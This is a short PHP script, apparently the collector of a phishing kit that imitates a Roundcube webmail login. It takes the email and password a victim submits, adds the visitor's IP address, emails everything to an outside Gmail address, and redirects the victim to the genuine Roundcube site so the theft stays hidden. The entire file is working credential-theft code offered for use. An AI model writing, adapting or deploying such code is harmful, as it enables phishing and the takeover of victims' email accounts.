<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "User ID             : ".$_POST['email']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "hpert6620@gmail.com";
$subject = " Roundcube 2021  | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://roundcube.net/");
?>


